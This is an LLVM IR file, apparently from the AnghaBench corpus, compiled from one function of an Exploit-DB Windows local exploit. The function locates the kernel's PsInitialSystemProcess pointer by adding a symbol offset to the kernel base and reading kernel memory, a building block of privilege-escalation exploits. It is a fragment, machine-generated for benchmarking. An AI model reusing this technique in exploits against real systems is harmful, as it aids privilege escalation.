; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41020.c_PsInitialSystemProcess.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41020.c_PsInitialSystemProcess.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"ntoskrnl.exe\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"PsInitialSystemProcess\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @PsInitialSystemProcess() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = call i32 @LoadLibrary(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %6 = sext i32 %5 to i64
  store i64 %6, i64* %1, align 8
  %7 = load i64, i64* %1, align 8
  %8 = trunc i64 %7 to i32
  %9 = call i32 @GetProcAddress(i32 %8, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %10 = sext i32 %9 to i64
  store i64 %10, i64* %2, align 8
  %11 = load i64, i64* %1, align 8
  %12 = trunc i64 %11 to i32
  %13 = call i32 @FreeLibrary(i32 %12)
  store i64 0, i64* %3, align 8
  %14 = call i64 (...) @GetNTOsBase()
  store i64 %14, i64* %4, align 8
  %15 = load i64, i64* %4, align 8
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %25

17:                                               ; preds = %0
  %18 = load i64, i64* %2, align 8
  %19 = load i64, i64* %1, align 8
  %20 = sub nsw i64 %18, %19
  %21 = load i64, i64* %4, align 8
  %22 = add nsw i64 %20, %21
  %23 = bitcast i64* %3 to i32*
  %24 = call i32 @ReadFromAddress(i64 %22, i32* %23, i32 8)
  br label %25

25:                                               ; preds = %17, %0
  %26 = load i64, i64* %3, align 8
  ret i64 %26
}

declare dso_local i32 @LoadLibrary(i8*) #1

declare dso_local i32 @GetProcAddress(i32, i8*) #1

declare dso_local i32 @FreeLibrary(i32) #1

declare dso_local i64 @GetNTOsBase(...) #1

declare dso_local i32 @ReadFromAddress(i64, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
